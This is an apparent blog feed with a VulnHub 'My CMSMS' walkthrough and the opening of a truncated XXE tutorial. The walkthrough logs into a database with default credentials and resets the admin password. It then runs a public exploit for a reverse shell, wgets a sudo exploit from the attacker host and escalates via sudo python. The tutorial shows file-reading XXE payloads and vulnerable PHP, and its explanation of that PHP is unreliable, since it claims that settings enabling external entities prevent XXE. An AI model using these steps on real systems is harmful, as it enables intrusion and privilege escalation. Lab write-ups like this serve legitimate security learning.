        <content type="html"><![CDATA[<h1 id="My-CMSMS-Walkthrough"><a href="#My-CMSMS-Walkthrough" class="headerlink" title="My CMSMS Walkthrough"></a>My CMSMS Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/my-cmsms-1,498/">My CMSMS: 1</a></p><p><img src="/picture/image-20250325194806444.png" alt="image-20250325194806444"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先做全端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.103</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250318105230162.png" alt="image-20250318105230162"></p><p>以及应用版本发现</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,3306,33060 -A 172.16.33.103</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250318105330821.png" alt="image-20250318105330821"></p><p>仅发现了 HTTP 服务端的 CMS Made Simple ，并没有获得其他有用的信息。似乎 33036 端口枚举失败了，尝试进一步探测：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p33060 -A -T4 172.16.33.103</span><br></pre></td></tr></table></figure><p>好吧看来还是失败了</p><p><img src="/picture/image-20250318105548168.png" alt="image-20250318105548168"></p><p>先从 22 端口开始，尝试利用配置缺陷，以 root 身份登陆，看看有没有泄露信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.103                                       </span><br></pre></td></tr></table></figure><p>泄露了 HTTP 服务的 CMS：CMSMS 及作者信息</p><p><img src="/picture/image-20250318105716413.png" alt="image-20250318105716413"></p><p>让我们来看看 80 端口，先做一个目录扫描：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.103/</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250318110628253.png" alt="image-20250318110628253"></p><p>发现 phpinfo 访问，发现泄露 mycmsms 版本：4.19.8 </p><p><img src="/picture/image-20250318113200016.png" alt="image-20250318113200016"></p><blockquote><p> 十分遗憾的是，直接搜索 My CMSMS exploit 跳出来的直接是该靶机的解题过程，这不是我的本意</p></blockquote><p>可以在主页面左下角找到 CMS Made Simple 版本 2.2.13</p><p><img src="/picture/image-20250318120029915.png" alt="image-20250318120029915"></p><p>去寻找下 CMS Made Simple 2.2.13 漏洞。遗憾的是，搜索到的漏洞都与要登陆 &#x2F;admin 后才能利用：</p><p><img src="/picture/image-20250318120627194.png" alt="image-20250318120627194"></p><p>可以在这里发现后台登陆页面：</p><p><img src="/picture/image-20250318202509495.png" alt="image-20250318202509495"></p><p>尝试 admin&#x2F;admin ，admin&#x2F;passwd 等弱口令登陆，可惜失败了，同时发现，后台对于输出做了限制，防止用户名泄露</p><p><img src="/picture/image-20250318202825982.png" alt="image-20250318202825982"></p><p>更改 POST 数据，看看有没有 SQL 注入漏洞，也失败了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&quot;%)#--%23&amp;password=admin&#x27;&quot;%)#--%23&amp;loginsubmit=Submit&#x27;&quot;%)#--%23</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250318203122088.png" alt="image-20250318203122088"></p><p>来看下 3306 端口吧，尝试默认密码组合登陆：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 172.16.33.103 -uroot -proot --skip-ssl-verify-server-cert </span><br></pre></td></tr></table></figure><p>十分幸运，登陆成功了：</p><p><img src="/picture/image-20250318210954301.png" alt="image-20250318210954301"></p><p>查看数据库：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cmsms_db           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.053 sec)</span><br></pre></td></tr></table></figure><p>使用 cmsms_db 数据库，查看数据表：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; use cmsms_db;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">MySQL [cmsms_db]&gt; show tables;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| Tables_in_cmsms_db             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| cms_additional_users           |</span><br><span class="line">| cms_additional_users_seq       |</span><br><span class="line">| cms_admin_bookmarks            |</span><br><span class="line">| cms_admin_bookmarks_seq        |</span><br><span class="line">| cms_adminlog                   |</span><br><span class="line">| cms_content                    |</span><br><span class="line">| cms_content_props              |</span><br><span class="line">| cms_content_props_seq          |</span><br><span class="line">| cms_content_seq                |</span><br><span class="line">| cms_event_handler_seq          |</span><br><span class="line">| cms_event_handlers             |</span><br><span class="line">| cms_events                     |</span><br><span class="line">| cms_events_seq                 |</span><br><span class="line">| cms_group_perms                |</span><br><span class="line">| cms_group_perms_seq            |</span><br><span class="line">| cms_groups                     |</span><br><span class="line">| cms_groups_seq                 |</span><br><span class="line">| cms_layout_design_cssassoc     |</span><br><span class="line">| cms_layout_design_tplassoc     |</span><br><span class="line">| cms_layout_designs             |</span><br><span class="line">| cms_layout_stylesheets         |</span><br><span class="line">| cms_layout_templates           |</span><br><span class="line">| cms_layout_tpl_addusers        |</span><br><span class="line">| cms_layout_tpl_categories      |</span><br><span class="line">| cms_layout_tpl_type            |</span><br><span class="line">| cms_locks                      |</span><br><span class="line">| cms_mod_cmsjobmgr              |</span><br><span class="line">| cms_mod_filepicker_profiles    |</span><br><span class="line">| cms_module_deps                |</span><br><span class="line">| cms_module_news                |</span><br><span class="line">| cms_module_news_categories     |</span><br><span class="line">| cms_module_news_categories_seq |</span><br><span class="line">| cms_module_news_fielddefs      |</span><br><span class="line">| cms_module_news_fieldvals      |</span><br><span class="line">| cms_module_news_seq            |</span><br><span class="line">| cms_module_search_index        |</span><br><span class="line">| cms_module_search_items        |</span><br><span class="line">| cms_module_search_items_seq    |</span><br><span class="line">| cms_module_search_words        |</span><br><span class="line">| cms_module_smarty_plugins      |</span><br><span class="line">| cms_module_templates           |</span><br><span class="line">| cms_modules                    |</span><br><span class="line">| cms_permissions                |</span><br><span class="line">| cms_permissions_seq            |</span><br><span class="line">| cms_routes                     |</span><br><span class="line">| cms_siteprefs                  |</span><br><span class="line">| cms_user_groups                |</span><br><span class="line">| cms_userplugins                |</span><br><span class="line">| cms_userplugins_seq            |</span><br><span class="line">| cms_userprefs                  |</span><br><span class="line">| cms_users                      |</span><br><span class="line">| cms_users_seq                  |</span><br><span class="line">| cms_version                    |</span><br><span class="line">+--------------------------------+</span><br><span class="line">53 rows in set (0.035 sec)</span><br></pre></td></tr></table></figure><p>查看 cms_users 信息，发现 admin 哈希密码 <code>fb67c6d24e756229aab021cea7605fb3</code> ：</p><p><img src="/picture/image-20250318211324263.png" alt="image-20250318211324263"></p><p>查看该密文是由什么加密：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hash-identifier fb67c6d24e756229aab021cea7605fb3</span><br></pre></td></tr></table></figure><p>看起来最有可能是 MD5</p><p><img src="/picture/image-20250318211936574.png" alt="image-20250318211936574"></p><p>看看能不能用 hashcat 的字典模式暴力破解出来：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 fb67c6d24e756229aab021cea7605fb3 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>可惜没跑出来</p><p><img src="/picture/image-20250318212045908.png" alt="image-20250318212045908"></p><p>由于是 root 权限，看看能不能直接更改密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [cmsms_db]&gt; update cms_users set password = MD5(&#x27;123456&#x27;) where username = &#x27;admin&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.037 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure><p>使用 admin &#x2F; 123456 登陆看看，还是失败了</p><p><img src="/picture/image-20250318213254470.png" alt="image-20250318213254470"></p><p>既然已知 CMS 的版本，那岂不是可以去网上搜索 admin 账户的密码的加密方式？说干就干，在网站搜索 CMS Made Simple admin password </p><p>幸运的是，在 <a href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">CMS Made Simple Admin password recovery</a> 中找到了 admin 密码的加密方式：</p><p><img src="/picture/image-20250318215218448.png" alt="image-20250318215218448"></p><p>稍作更改：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;123&#x27;))) where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>成功进入后台：</p><p><img src="/picture/image-20250318215409826.png" alt="image-20250318215409826"></p><p>使用 <a href="https://dev.cmsmadesimple.org/bug/view/12275">https://dev.cmsmadesimple.org/bug/view/12275</a> 中的 exp 尝试 RCE</p><p><img src="/picture/image-20250318220216279.png" alt="image-20250318220216279"></p><p>利用失败，尝试扩大利用范围，使用版本相近的 2.2.14 exp 代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -m 48779</span><br><span class="line">python 48779.py --url http://172.16.33.103/admin/login.php -u admin -p 123 -lhost 10.8.0.90 -lport 1234</span><br><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure><p>getshell ：</p><p><img src="/picture/image-20250318222649383.png" alt="image-20250318222649383"></p><p><img src="/picture/image-20250318222710238.png" alt="image-20250318222710238"></p><p>接下来是提权，查看 sudo 版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250319182043155.png" alt="image-20250319182043155"></p><p>搜索对应版本 sudo 漏洞利用代码：CVE-2021-3156</p><p>上传至目标主机</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90:4444/exp.py</span><br><span class="line"><span class="built_in">chmod</span> +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/picture/image-20250319182951767.png" alt="image-20250319182951767"></p><p>或者在 &#x2F;var&#x2F;www&#x2F;html&#x2F;admin 目录下发现 .htpasswd 文件，内容为密文 <code>TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=</code></p><p>使用 cyberchef 的 magic 方法破解出账户和密码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">armour:Shield@123</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250319183333186.png" alt="image-20250319183333186"></p><p>切换至 armour 用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su armour</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250319183733223.png" alt="image-20250319183733223"></p><p>该用户具有 pyhon sudo 权限</p><p><img src="/picture/image-20250319184057890.png" alt="image-20250319184057890"></p><p>使用 python 提权：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/picture/image-20250319184130060.png" alt="image-20250319184130060"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE 学习记录</title>
      <link href="/2024/03/11/XXE%20exploit/"/>
      <url>/2024/03/11/XXE%20exploit/</url>
      
        <content type="html"><![CDATA[<p>前言：</p><p>上上周的青少年CTF擂台挑战赛 2024 #Round 1中，有一道XXE的题目，结合我对 moectf 那道XXE的印象，感觉都是直接复制、黏贴答案模板后改改就出了，没有系统的认真学；趁着有想法的时候把 XXE 系统学个一遍。。。</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="什么是-XXE？"><a href="#什么是-XXE？" class="headerlink" title="什么是 XXE？"></a>什么是 XXE？</h2><p>XXE 全称是：XML External Entity，也就是 XML 外部实体注入攻击，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p><h2 id="XML-基础学习（-XXE-要从认识-XML-开始）："><a href="#XML-基础学习（-XXE-要从认识-XML-开始）：" class="headerlink" title="XML 基础学习（ XXE 要从认识 XML 开始）："></a>XML 基础学习（ XXE 要从认识 XML 开始）：</h2><p>XML指可扩展标记语言（EXtensible Markup Language）是一种标记语言，很类似 HTML。XML的设计宗旨是传输数据，而非显示数据。XML标签没有被预定义。需要自行定义标签。XML被设计为具有自我描述性。XML是 W3C 的推荐标准。</p><h3 id="XML-是不作为的："><a href="#XML-是不作为的：" class="headerlink" title="XML 是不作为的："></a>XML 是不作为的：</h3><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p><p>下面是 John 写给 George 的便签，存储为 XML ：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p><h2 id="DTD-："><a href="#DTD-：" class="headerlink" title="DTD ："></a>DTD ：</h2><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h3 id="一些前置XML元素知识："><a href="#一些前置XML元素知识：" class="headerlink" title="一些前置XML元素知识："></a>一些前置XML元素知识：</h3><h4 id=""><a href="#" class="headerlink" title="&lt;!ELEMENT&gt;"></a><code>&lt;!ELEMENT&gt;</code></h4><p>在XML中，<code>&lt;!ELEMENT&gt;</code> 元素用于定义元素的结构和内容模型。具体来说，<code>&lt;!ELEMENT&gt;</code> 元素可以用来：</p><ol><li>定义元素的名称：<code>&lt;!ELEMENT&gt;</code> 元素指定了XML文档中允许出现的元素的名称。</li><li>定义元素的内容模型：<code>&lt;!ELEMENT&gt;</code> 元素可以指定元素的内容模型，即元素可以包含哪些子元素以及它们的顺序和数量。</li></ol><p>例如，下面是一个使用 <code>&lt;!ELEMENT&gt;</code> 元素定义元素的示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT person (firstname, lastname, age)&gt;</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>&lt;!ELEMENT&gt;</code> 元素定义了一个名为”person”的元素，它包含了三个子元素：firstname、lastname 和 age。这样就规定了”person”元素的结构和内容模型。</p><p>通过使用 <code>&lt;!ELEMENT&gt;</code> 元素，可以在XML文档中明确定义元素的结构，有助于确保文档的有效性和一致性。</p><h4 id="-1"><a href="#-1" class="headerlink" title="&lt;!ENTITY&gt;"></a><code>&lt;!ENTITY&gt;</code></h4><p>在XML中，<code>&lt;!ENTITY&gt;</code> 元素用于定义实体。</p><h3 id="内部的-DOCTYPE-声明："><a href="#内部的-DOCTYPE-声明：" class="headerlink" title="内部的 DOCTYPE 声明："></a>内部的 DOCTYPE 声明：</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h4 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h4><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档（note为根元素）。</p><p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”，如果是<code>&lt;!ELEMENT note ANY&gt;</code>则表示可以接受<strong>任何元素</strong></p><p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p><p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p><p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p><p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p><h3 id="外部文档声明："><a href="#外部文档声明：" class="headerlink" title="外部文档声明："></a>外部文档声明：</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h3 id="DTD的作用："><a href="#DTD的作用：" class="headerlink" title="DTD的作用："></a>DTD的作用：</h3><ul><li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li><li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li><li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li><li>您还可以使用 DTD 来验证您自身的数据。</li></ul><h3 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p><h4 id="实体类别与引用："><a href="#实体类别与引用：" class="headerlink" title="实体类别与引用："></a>实体类别与引用：</h4><h5 id="通用实体："><a href="#通用实体：" class="headerlink" title="通用实体："></a>通用实体：</h5><p>用 <code>&amp;实体名;</code> 引用的实体，他在 DTD 中定义，在 XML 文档中引用</p><p>实例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure><p>在这个例子中，实体 <code>&amp;file;</code> 引用了位于”file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini”路径下的文件。</p><h5 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h5><p>使用 <code>% 实体名</code>（<strong>这里面空格不能少</strong>） 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p><p>实例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;message&gt;%an-element; %remote-dtd;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个示例中：</p><p>第一个参数实体定义如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个参数实体名为”an-element”，其内容是一个用于定义元素结构的字符串，指定了一个名为”mytag”的元素，它包含一个名为”subtag”的子元素。</p><p>第二个参数实体定义如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个参数实体名为”remote-dtd”，其内容是一个外部实体引用，指定了一个外部DTD文件的位置。</p><p>通过使用参数实体，我们可以在XML文档中定义可重复使用的片段，提高文档的可读性和可维护性。</p><p>实体根据引用方式，还可分为内部实体与外部实体</p><h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><p>DTD：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注释：别忘记一个通用实体由三部分构成：一个和号 ( <code>&amp;</code> )，一个<code>实体名称</code>， 以及一个分号 ( <code>;</code> )</p><h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体:"></a>外部实体:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>URL中能写哪些类型的外部实体呢？如图所示：</p><p><img src="/picture/WiJR52dgfnx9Dpb.png" alt="image-20231008193523097"></p><p>实列：</p><p>DTD：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，还有一种引用方式是使用 引用 <strong>公用 DTD</strong> 的方法，语法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 <code>SYSTEM</code> 一样的作用</p><h4 id="XML外部实体注入："><a href="#XML外部实体注入：" class="headerlink" title="XML外部实体注入："></a>XML外部实体注入：</h4><p>XML External Entity Injection 即 xml 外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p><h5 id="有回显读敏感文件"><a href="#有回显读敏感文件" class="headerlink" title="有回显读敏感文件"></a>有回显读敏感文件</h5><p>本题为 ctfshow web 373 题的源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>以下是代码的简要解释：</p><ol><li><code>error_reporting(0);</code> - 禁用错误报告，这意味着将不会显示任何错误信息。</li><li><code>libxml_disable_entity_loader(false);</code> - 启用XML实体加载器，这是为了防止XML外部实体注入攻击。</li><li><code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code> - 从输入中获取XML文件的内容。</li><li><code>if(isset($xmlfile))&#123;...&#125;</code> - 检查是否成功获取XML文件内容。</li><li><code>$dom = new DOMDocument();</code> - 创建一个新的DOMDocument对象，用于处理XML文档。</li><li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code> - 加载XML文件内容到DOMDocument对象中，并禁用实体和DTD加载，以防止实体注入攻击。</li><li><code>$creds = simplexml_import_dom($dom);</code> - 将DOMDocument对象转换为SimpleXMLElement对象，以便于访问XML数据。</li><li><code>$ctfshow = 